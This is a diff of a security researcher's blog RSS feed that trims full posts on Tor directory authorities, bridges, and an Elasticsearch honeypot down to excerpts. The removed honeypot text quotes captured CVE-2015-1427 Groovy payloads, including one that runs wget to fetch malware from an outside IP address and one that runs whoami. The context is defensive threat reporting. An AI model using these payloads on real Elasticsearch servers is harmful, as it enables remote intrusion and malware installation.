-&lt;p&gt;&lt;a href=&#34;https://gitweb.torproject.org/tor.git/tree/src/or/config.c#n824&#34;&gt;Hardcoded into each Tor client&lt;/a&gt; is the information about 10 beefy Tor nodes run by trusted volunteers. These nodes have a very special role - to maintain the status of the entire Tor network. These nodes are known as &lt;strong&gt;directory authorities&lt;/strong&gt; (DA&amp;rsquo;s).&lt;/p&gt;
-
-&lt;p&gt;I&amp;rsquo;ve &lt;a href=&#34;https://jordan-wright.com/blog/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized/&#34;&gt;written a bit&lt;/a&gt; about DA&amp;rsquo;s in the past. Distributed around the world, DA&amp;rsquo;s are in charge of distributing an ever-updated master list of all known Tor relays. They are the gatekeepers that choose what relays are valid, and when.&lt;/p&gt;
-
-&lt;p&gt;So why 10? We know it&amp;rsquo;s usually a bad idea to have an even number of things voting on something, since there could be ties. You&amp;rsquo;ll recall that in the previous post I mentioned that there is a master list of relays &lt;em&gt;and&lt;/em&gt; a master list of bridges. This is where the split happens. 9 of the DA&amp;rsquo;s maintain the master list of relays, while one DA (Tonga) maintains the list of bridges.&lt;/p&gt;
-
-&lt;p&gt;Here are the DA&amp;rsquo;s:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/how_tor_works/authorities.png&#34;/&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;reaching-a-consensus&#34;&gt;Reaching a Consensus&lt;/h3&gt;
-
-&lt;p&gt;So there are DA&amp;rsquo;s and they maintain the status of the Tor network. But, &lt;strong&gt;how&lt;/strong&gt;?&lt;/p&gt;
-
-&lt;p&gt;The status of all the Tor relays is maintained in a living document called the &lt;strong&gt;consensus&lt;/strong&gt;. DA&amp;rsquo;s maintain this document and update it every hour by a vote. Here&amp;rsquo;s a basic flow of how this updating process works.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Each DA compiles a list of all known relays&lt;/li&gt;
-&lt;li&gt;Each DA then computes the other needed data, such as relay flags, bandwidth weights, and more&lt;/li&gt;
-&lt;li&gt;The DA then submits this data as a &amp;ldquo;status-vote&amp;rdquo; to all the other authorities&lt;/li&gt;
-&lt;li&gt;Each DA next will go get any other votes it is missing from the other authorities&lt;/li&gt;
-&lt;li&gt;All the parameters, relay information, etc. from each vote are combined or computed and then &lt;strong&gt;signed&lt;/strong&gt; by each DA&lt;/li&gt;
-&lt;li&gt;This signature is then posted to the other DA&amp;rsquo;s&lt;/li&gt;
-&lt;li&gt;There should be a majority of the DA&amp;rsquo;s that agree on the data, validating the new consensus&lt;/li&gt;
-&lt;li&gt;The consensus is then published by each DA&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;You&amp;rsquo;ll notice that I mention each DA publishes this consensus. This is done over HTTP such that anyone can download the latest copy at &lt;code&gt;http://directory_authority/tor/status-vote/current/consensus/&lt;/code&gt;. You can see for yourself by downloading the most current consensus from &lt;code&gt;tor26&lt;/code&gt; &lt;a href=&#34;http://86.59.21.38/tor/status-vote/current/consensus/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;So we see a consensus&amp;hellip; but what does it mean?&lt;/p&gt;
-
-&lt;h3 id=&#34;anatomy-of-a-consensus&#34;&gt;Anatomy of a Consensus&lt;/h3&gt;
-
-&lt;p&gt;The consensus document is a bit tough to get a handle on right away just by reading &lt;a href=&#34;https://gitweb.torproject.org/torspec.git/tree/dir-spec.txt&#34;&gt;the spec&lt;/a&gt;. I find it helps to have things broken down visually to get an idea of how things are structured.&lt;/p&gt;
-
-&lt;p&gt;To help with this, I made a poster in the fantastic &lt;a href=&#34;https://github.com/corkami/&#34;&gt;corkami&lt;/a&gt; style. Here&amp;rsquo;s a dissection of a snipped down version of the Tor consensus document (click for full resolution!):&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/how_tor_works/consensus.png&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/how_tor_works/consensus_small.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
-&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;next-steps&#34;&gt;Next Steps&lt;/h3&gt;
-
-&lt;p&gt;The consensus is a powerful document. By having trusted authorities keeping a master list of relays and their capabilities, it is easy for new and existing clients to keep track of the addition and removal of Tor relays.&lt;/p&gt;
-
-&lt;p&gt;Now, you&amp;rsquo;ll notice that we haven&amp;rsquo;t really covered exit relays. These relays hold a very important position in the Tor network, and deserve their own discussion. So, in the next post we&amp;rsquo;ll talk about how exit relays work, and what happens when exit relay operators decide to &amp;ldquo;break bad&amp;rdquo;, or wreak havoc on Tor users.&lt;/p&gt;
-
-&lt;p&gt;Until then, let me know if you have any questions or comments below!&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;But how do clients know what relays are active? How is the Tor network actually organized and maintained? This post will answer this question by talking about a living document called the &lt;strong&gt;consensus&lt;/strong&gt; as well as introducing a few very important Tor nodes that run the show behind the scenes.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -1310,80 +241,13 @@ flag{at_least_it_isnt_php}
       <pubDate>Sat, 09 May 2015 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/how_tor_works_2.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/how_tor_works_2.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
-&lt;p&gt;Welcome back to my series on how Tor works! In the &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/02/28/how-tor-works-part-one/&#34;&gt;last post&lt;/a&gt;, we took a look at how Tor operates from a very high level. In this post, we&amp;rsquo;ll dive a bit deeper, taking a look at a potential issue with relays in order to introduce a new concept: &lt;strong&gt;bridges&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h3 id=&#34;relay-recap&#34;&gt;Relay Recap&lt;/h3&gt;
-
-&lt;p&gt;In the last post, we introduced relays as systems designed to move traffic in the Tor network. You&amp;rsquo;ll recall that there were three types of relays:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Entry/Guard Relays&lt;/strong&gt; - Entry points into the Tor network&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Middle Relays&lt;/strong&gt; - Send traffic from an entry relay to an exit relay&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Exit Relays&lt;/strong&gt; - Send the traffic out of the Tor network to the original destination&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Relays are created by volunteers by simply configuring the Tor software to act as a relay. As a reminder, if you have bandwidth to spare, consider setting up a Tor relay!&lt;/p&gt;
-
-&lt;h3 id=&#34;the-problem-with-relays&#34;&gt;The Problem With Relays&lt;/h3&gt;
-
-&lt;p&gt;When a Tor client starts up, it needs a way to fetch a list of all the entry, middle, and exit relays available. This list of all relays isn&amp;rsquo;t a secret. In fact, in the next post I&amp;rsquo;ll explain in detail how this list is distributed (for a sneak peek check out documents on the &lt;em&gt;concensus&lt;/em&gt;). While making this list public is necessary, it also presents a problem.&lt;/p&gt;
-
-&lt;p&gt;To figure out why this is problem, let&amp;rsquo;s play the role of the attacker and ask ourselves: &lt;em&gt;What Would an Oppressive Government Do (WWOGD)?&lt;/em&gt;. By thinking to ourselves what a &lt;strong&gt;&lt;em&gt;real OG&lt;/em&gt;&lt;/strong&gt; would do, we can figure out why Tor is built the way it is.&lt;/p&gt;
-
-&lt;p&gt;So what would a real OG do? Since censorship is a pretty big deal, and Tor is pretty darn good at getting around it, a real OG would want to block users from using Tor. There are two ways to &amp;ldquo;block Tor users&amp;rdquo;:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Block users coming out of Tor&lt;/li&gt;
-&lt;li&gt;Block users going into Tor&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The first situation is possible, and is up to the discretion of the device (router, etc.) or website owner. All a site owner needs to do is to download the list of Tor exit nodes and block all traffic from those nodes. While this would be unfortunate, there&amp;rsquo;s nothing Tor can really do about it.&lt;/p&gt;
-
-&lt;p&gt;However, the second situation is much worse. While blocking incoming Tor users can keep them from a particular site, blocking users from going into Tor will keep them from &lt;strong&gt;every&lt;/strong&gt; site, making Tor effectively useless to those under censorship - some of the users who need Tor most. Just using relays, this is possible since real OG&amp;rsquo;s can just download a list of all guard relays and block any traffic to them.&lt;/p&gt;
-
-&lt;p&gt;Thankfully, the Tor project thought of exactly this situation and came up with a clever solution around it. Say hello to &lt;strong&gt;bridges&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h3 id=&#34;introducing-bridges&#34;&gt;Introducing Bridges&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://www.torproject.org/docs/bridges.html.en&#34;&gt;Bridges&lt;/a&gt; are a clever solution to this problem. At their core, bridges are just unpublished entry relays. Users that are behind censored networks can use bridges as a way to access the Tor network.&lt;/p&gt;
-
-&lt;p&gt;So if bridges are unpublished, how do users know where they are? Won&amp;rsquo;t a master list need to be published somewhere? We&amp;rsquo;ll talk more about these master lists of relays and bridges in the next post, but for now the answer is yes - there is a list of bridges maintained by the Tor project.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;This list just isn&amp;rsquo;t made public.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Instead, the Tor project has created a way for users to receive a small list of bridges so that they can connect to the rest of the Tor network. This project, called &lt;a href=&#34;https://bridges.torproject.org/bridges&#34;&gt;BridgeDB&lt;/a&gt; gives users the information about a few bridges at a time. This makes sense, since a few bridges should be all any user needs.&lt;/p&gt;
-
-&lt;p&gt;By only giving users a few bridges at a time, it is possible to prevent OG&amp;rsquo;s from blocking all possible entry points into the Tor network. Sure, as relays are discovered they can be blocked, but can anyone really discover all the bridges?&lt;/p&gt;
-
-&lt;h3 id=&#34;can-anyone-find-every-bridge&#34;&gt;Can Anyone Find Every Bridge?&lt;/h3&gt;
-
-&lt;p&gt;The list of all bridges is a closely guarded secret. If a real OG were able to gain access to this list, it would be able to completely block users from using Tor. With this being the case, there has been &lt;a href=&#34;https://blog.torproject.org/blog/research-problems-ten-ways-discover-tor-bridges&#34;&gt;research&lt;/a&gt; done by the Tor project into possible ways people could discover all the bridges.&lt;/p&gt;
-
-&lt;p&gt;I&amp;rsquo;d like to talk very briefly about #2 and #6 on that list, since that&amp;rsquo;s &lt;a href=&#34;https://zmap.io/paper.pdf&#34;&gt;&lt;em&gt;exactly&lt;/em&gt;&lt;/a&gt; &lt;a href=&#34;http://www.cs.uml.edu/~xinwenfu/paper/Bridge.pdf&#34;&gt;what&lt;/a&gt; researchers have done with some significant success. In the first scenario, researchers scanned the entire IPv4 space using a fast port scanner called ZMap looking for Tor bridges and &amp;ldquo;were able to identify 79–86%&amp;rdquo;&lt;sup&gt;1&lt;/sup&gt; of them. I recommend reading the paper for the really cool technical details (about finding Tor bridges and ZMap in general).&lt;/p&gt;
-
-&lt;p&gt;The second scenario is a neat one and introduces an important challenge for Tor (or any network for that matter). It all comes down to a simple concept - &lt;em&gt;users can&amp;rsquo;t be trusted&lt;/em&gt;. In order to keep the Tor network as anonymous and locked down as possible, the Tor network is designed in such a way to intentionally distrust relay operators. We&amp;rsquo;ll see more examples of this later.&lt;/p&gt;
-
-&lt;h3 id=&#34;next-steps&#34;&gt;Next Steps&lt;/h3&gt;
-
-&lt;p&gt;In this post, we&amp;rsquo;ve talked about the need for relays that aren&amp;rsquo;t published in some &amp;ldquo;master list&amp;rdquo;. But, you&amp;rsquo;ll notice I didn&amp;rsquo;t give many details about &lt;em&gt;how&lt;/em&gt; this master list is created, or how Tor clients get access to the list.&lt;/p&gt;
-
-&lt;p&gt;So, in our next post, we&amp;rsquo;ll take a look at how the Tor network maintains the status of all relays in the network. We&amp;rsquo;ll also introduce some very powerful relays in the Tor network who run the show - &lt;strong&gt;directory authorities&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;As always, please let me know if you have any questions or comments below!&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Update: &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/05/14/how-tor-works-part-three-the-consensus/&#34;&gt;Part three - &amp;ldquo;The Consensus&amp;rdquo;&lt;/a&gt; has been published!&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-
-&lt;p&gt;&lt;sup&gt;[1] &lt;a href=&#34;https://zmap.io/paper.pdf&#34;&gt;https://zmap.io/paper.pdf&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
-</description>
+&lt;p&gt;Welcome back to my series on how Tor works! In the &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/02/28/how-tor-works-part-one/&#34;&gt;last post&lt;/a&gt;, we took a look at how Tor operates from a very high level. In this post, we&amp;rsquo;ll dive a bit deeper, taking a look at a potential issue with relays in order to introduce a new concept: &lt;strong&gt;bridges&lt;/strong&gt;.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -1392,9 +256,7 @@ flag{at_least_it_isnt_php}
       <pubDate>Thu, 30 Apr 2015 20:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elk_results.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elk_results.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
@@ -1403,85 +265,8 @@ flag{at_least_it_isnt_php}
 
 &lt;p&gt;After re-building the box from scratch (with many improvements!), I &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/&#34;&gt;created a honeypot&lt;/a&gt; called Elastichoney to measure how much this vulnerability is being exploited in the wild. Since then, I&amp;rsquo;ve had multiple sensors silently logging all attempts to exploit this vulnerability.&lt;/p&gt;
 
-&lt;p&gt;Here are the results.&lt;/p&gt;
-
-&lt;h3 id=&#34;who-s-attacking-me&#34;&gt;Who&amp;rsquo;s Attacking Me?&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/jordan-wright/elastichoney&#34;&gt;Elastichoney&lt;/a&gt; keeps track of quite a bit of data, including the source IP and payload sent to the sensor. I logged every attack to an Elasticsearch instance (have some irony - free of charge!) and enriched the data with geoip information using Logstash. Finally, I created a slick dashboard using Kibana to view the results.&lt;/p&gt;
-
-&lt;p&gt;So far, I&amp;rsquo;ve had around 8k attempts to attack the honeypots from over 300 unique IP addresses. One of the immediate things I noticed was thing a vast majority (over 93%) of attacks were coming from Chinese IP addresses:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/elastichoney_elk/map.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;The second thing that I noticed was how fast the majority of exploit attempts died down. Here&amp;rsquo;s a histogram of attack attempts since the sensors have been running:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/elastichoney_elk/histogram.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;You&amp;rsquo;ll notice a spike between March 20&lt;sup&gt;th&lt;/sup&gt; and April 11&lt;sup&gt;th&lt;/sup&gt;. These attacks came from a few Chinese IP addresses that all stopped their attacks at the same time. But hey, attacks come in, attacks go out. &lt;a href=&#34;http://cdn.meme.am/instances/500x/58834359.jpg&#34;&gt;You can&amp;rsquo;t explain that.&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;what-are-the-attackers-doing&#34;&gt;What are the Attackers Doing?&lt;/h3&gt;
-
-&lt;p&gt;I mentioned that Elastichoney logs the payload sent to the sensor. In some cases, these were attempts to run boring commands like &lt;code&gt;whoami&lt;/code&gt;, etc. However, in quite a few cases, the malware attempted to use &lt;code&gt;wget&lt;/code&gt; to download and run malware - similar to what happened to my DO instance.&lt;/p&gt;
-
-&lt;p&gt;These looked something like this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;source={&amp;quot;query&amp;quot;:+{&amp;quot;filtered&amp;quot;:+{&amp;quot;query&amp;quot;:+{&amp;quot;match_all&amp;quot;:+{}}}},+&amp;quot;script_fields&amp;quot;:+{&amp;quot;exp&amp;quot;:+{&amp;quot;script&amp;quot;:+&amp;quot;import+java.util.*;import+java.io.*;String+str+=+\&amp;quot;\&amp;quot;;BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\&amp;quot;wget+-O+/tmp/zuosyn+http://115.28.216.181:995/zuosyn\&amp;quot;).getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\&amp;quot;\r\n\&amp;quot;);}sb.toString();&amp;quot;}},+&amp;quot;size&amp;quot;:+1}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;These malware samples were generally nothing more than basic bots. They could be compiled ELF binaries, or simple Perl scripts. While we&amp;rsquo;re working to let Elastichoney automatically download these malware samples, for now the data is in the logs. Speaking of logs&amp;hellip;&lt;/p&gt;
-
-&lt;h3 id=&#34;the-raw-data&#34;&gt;The Raw Data&lt;/h3&gt;
-
-&lt;p&gt;I&amp;rsquo;m a fan of open-sourcing as much information as possible if it helps the community. As such, I&amp;rsquo;ve decided to release all the logs I currently have.&lt;/p&gt;
-
-&lt;p&gt;You can download the raw JSON logs &lt;a href=&#34;https://jordan-wright.com/blog/downloads/elastichoney_logs.json.gz&#34;&gt;here&lt;/a&gt;. Here&amp;rsquo;s an example log to show how the logs are structured:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
-    &amp;quot;source&amp;quot;: &amp;quot;222.186.56.46&amp;quot;,
-    &amp;quot;@timestamp&amp;quot;: &amp;quot;2015-05-10T15:44:56.803Z&amp;quot;,
-    &amp;quot;url&amp;quot;: &amp;quot;x.x.x.x:9200/_search?&amp;quot;,
-    &amp;quot;method&amp;quot;: &amp;quot;GET&amp;quot;,
-    &amp;quot;form&amp;quot;: &amp;quot;form_payload&amp;quot;,
-    &amp;quot;payload&amp;quot;: &amp;quot;json_payload&amp;quot;,
-    &amp;quot;headers&amp;quot;: {
-        &amp;quot;user_agent&amp;quot;: &amp;quot;python-requests/2.4.1 CPython/2.7.8 Windows/2003Server&amp;quot;,
-        &amp;quot;host&amp;quot;: &amp;quot;x.x.x.x:9200&amp;quot;,
-        &amp;quot;content_type&amp;quot;: &amp;quot;&amp;quot;,
-        &amp;quot;accept_language&amp;quot;: &amp;quot;&amp;quot;
-    },
-    &amp;quot;type&amp;quot;: &amp;quot;attack&amp;quot;,
-    &amp;quot;honeypot&amp;quot;: &amp;quot;x.x.x.x&amp;quot;,
-    &amp;quot;@version&amp;quot;: &amp;quot;1&amp;quot;,
-    &amp;quot;host&amp;quot;: &amp;quot;127.0.0.1:39642&amp;quot;,
-    &amp;quot;name&amp;quot;: &amp;quot;Python Requests&amp;quot;,
-    &amp;quot;os&amp;quot;: &amp;quot;Windows&amp;quot;,
-    &amp;quot;os_name&amp;quot;: &amp;quot;Windows&amp;quot;,
-    &amp;quot;device&amp;quot;: &amp;quot;Other&amp;quot;,
-    &amp;quot;major&amp;quot;: &amp;quot;2&amp;quot;,
-    &amp;quot;minor&amp;quot;: &amp;quot;4&amp;quot;,
-    &amp;quot;geoip&amp;quot;: {
-        &amp;quot;ip&amp;quot;: &amp;quot;222.186.56.46&amp;quot;,
-        &amp;quot;country_code2&amp;quot;: &amp;quot;CN&amp;quot;,
-        &amp;quot;country_code3&amp;quot;: &amp;quot;CHN&amp;quot;,
-        &amp;quot;country_name&amp;quot;: &amp;quot;China&amp;quot;,
-        &amp;quot;continent_code&amp;quot;: &amp;quot;AS&amp;quot;,
-        &amp;quot;region_name&amp;quot;: &amp;quot;04&amp;quot;,
-        &amp;quot;city_name&amp;quot;: &amp;quot;Nanjing&amp;quot;,
-        &amp;quot;latitude&amp;quot;: 32.0617,
-        &amp;quot;longitude&amp;quot;: 118.77780000000001,
-        &amp;quot;timezone&amp;quot;: &amp;quot;Asia/Shanghai&amp;quot;,
-        &amp;quot;real_region_name&amp;quot;: &amp;quot;Jiangsu&amp;quot;,
-        &amp;quot;location&amp;quot;: [118.77780000000001, 32.0617]
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As always, let me know if you have any questions or comments below!&lt;/p&gt;
-
-&lt;p&gt;Enjoy!&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;Here are the results.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -1490,68 +275,412 @@ flag{at_least_it_isnt_php}
       <pubDate>Mon, 23 Mar 2015 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elastichoney.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elastichoney.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
-&lt;p&gt;I recently &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/&#34;&gt;wrote&lt;/a&gt; about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are taking place, I decided to write a simple honeypot designed to mimic a vulnerable Elasticsearch (ES) instance. Say hello to &lt;a href=&#34;http://github.com/jordan-wright/elastichoney&#34;&gt;elastichoney&lt;/a&gt;!&lt;/p&gt;
+&lt;p&gt;I recently &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/&#34;&gt;wrote&lt;/a&gt; about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are taking place, I decided to write a simple honeypot designed to mimic a vulnerable Elasticsearch (ES) instance. Say hello to &lt;a href=&#34;http://github.com/jordan-wright/elastichoney&#34;&gt;elastichoney&lt;/a&gt;!
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Remote Code Execution in Elasticsearch - CVE-2015-1427</title>
+      <link>https://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</link>
+      <pubDate>Sun, 08 Mar 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elk_rce.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
-&lt;h3 id=&#34;how-it-works&#34;&gt;How it Works&lt;/h3&gt;
 
-&lt;p&gt;This honeypot is pretty simple. It takes requests on the &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;/_search&lt;/code&gt;, and &lt;code&gt;/_nodes&lt;/code&gt; endpoints and returns a JSON response that is identical to a vulnerable ES instance (should be identical - I took the responses straight from one of my hosts that got 0wned).&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;TL;DR If you have an elasticsearch instance that is publicly available, upgrade to 1.4.3 or later &lt;strong&gt;now&lt;/strong&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;Attacks are logged as soon as they are detected. By default, elastichoney logs the attacks in JSON format to &lt;code&gt;stdout&lt;/code&gt;, as well as to a file called &lt;code&gt;elastichoney.log&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Elasticsearch (the &amp;ldquo;E&amp;rdquo; in ELK) is a full-text search engine that makes data aggregation and querying easy. It has an extensive JSON API that allows everything from searching to system management. This post will show how a new vulnerability, CVE-2015-1427, allows attackers to leverage features of this API to gain unauthenticated remote code execution (RCE).&lt;/p&gt;
 
-&lt;p&gt;It&amp;rsquo;s important to note that this is by no means foolproof. Clever people can take a look at &lt;a href=&#34;http://github.com/jordan-wright/elastichoney&#34;&gt;the code&lt;/a&gt; and quickly find ways to detect the honeypot. It&amp;rsquo;s not perfect, but it works. Let&amp;rsquo;s take a look at some results.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Much of the analysis discovering this vulnerability was originally found on a blog post &lt;a href=&#34;http://drops.wooyun.org/papers/5107&#34;&gt;here&lt;/a&gt; (&lt;a href=&#34;https://translate.google.com/translate?hl=en&amp;amp;sl=zh-CN&amp;amp;tl=en&amp;amp;u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F5107&#34;&gt;translated&lt;/a&gt;). This post aims to translate and provide more detail on the vulnerability.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>How Tor Works: Part One</title>
+      <link>https://jordan-wright.com/blog/2015/02/28/how-tor-works-part-one/</link>
+      <pubDate>Sat, 28 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2015/02/28/how-tor-works-part-one/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/how_tor_works_1.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
-&lt;h3 id=&#34;results&#34;&gt;Results&lt;/h3&gt;
 
-&lt;p&gt;Very quickly after I deployed the honeypot, I started getting hit by attackers scanning large swathes of the Internet looking for vulnerable systems. To date, I&amp;rsquo;ve seen approx. 2000 attacks from over 60 unique IP&amp;rsquo;s over the course of a few days, all without advertising my elastichoney instance anywhere.&lt;/p&gt;
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
-&lt;p&gt;Here&amp;rsquo;s an entry from my logs that is attempting to exploit the CVE-2015-1427 that I wrote about:&lt;/p&gt;
+&lt;p&gt;Tor is an anonymity tool used by those who want to stay private and uncensored when browsing the Internet. Over time, it&amp;rsquo;s grown to be pretty darn good at this. This makes the security, stability, and speed of the underlying network critical to those depending on it.&lt;/p&gt;
 
-&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
-    &amp;quot;source&amp;quot;: &amp;quot;[redacted]&amp;quot;,
-    &amp;quot;@timestamp&amp;quot;: &amp;quot;2015-03-23T13:34:22.519890008-05:00&amp;quot;,
-    &amp;quot;url&amp;quot;: &amp;quot;[redacted]:9200/_search?pretty&amp;quot;,
-    &amp;quot;method&amp;quot;: &amp;quot;POST&amp;quot;,
-    &amp;quot;form&amp;quot;: &amp;quot;pretty=&amp;amp;{\&amp;quot;script_fields\&amp;quot;:+{\&amp;quot;iswin\&amp;quot;:+{\&amp;quot;lang\&amp;quot;:+\&amp;quot;groovy\&amp;quot;,+\&amp;quot;script\&amp;quot;:+\&amp;quot;java.lang.Math.class.forName(\\\&amp;quot;java.io.BufferedReader\\\&amp;quot;).getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\&amp;quot;java.io.InputStreamReader\\\&amp;quot;).getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\&amp;quot;java.lang.Runtime\\\&amp;quot;).getRuntime().exec(\\\&amp;quot;whoami\\\&amp;quot;).\\tgetInputStream())).readLines()\&amp;quot;}},+\&amp;quot;size\&amp;quot;:+1}=&amp;quot;,
-    &amp;quot;payload&amp;quot;: &amp;quot;&amp;quot;,
-    &amp;quot;headers&amp;quot;: {
-        &amp;quot;user_agent&amp;quot;: &amp;quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&amp;quot;,
-        &amp;quot;host&amp;quot;: &amp;quot;[redacted]:9200&amp;quot;,
-        &amp;quot;content_type&amp;quot;: &amp;quot;application/x-www-form-urlencoded&amp;quot;,
-        &amp;quot;accept_language&amp;quot;: &amp;quot;&amp;quot;
-    },
-    &amp;quot;type&amp;quot;: &amp;quot;attack&amp;quot;,
-    &amp;quot;honeypot&amp;quot;: &amp;quot;[redacted]&amp;quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;But how does Tor work under the hood? In this series of posts, we&amp;rsquo;ll take a deep dive into the structure and protocols used by the Tor network in order to see first-hand how Tor operates.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Gophish Update: Getting Closer to Alpha!</title>
+      <link>https://jordan-wright.com/blog/2015/02/26/gophish-update-getting-closer-to-alpha/</link>
+      <pubDate>Thu, 26 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2015/02/26/gophish-update-getting-closer-to-alpha/</guid>
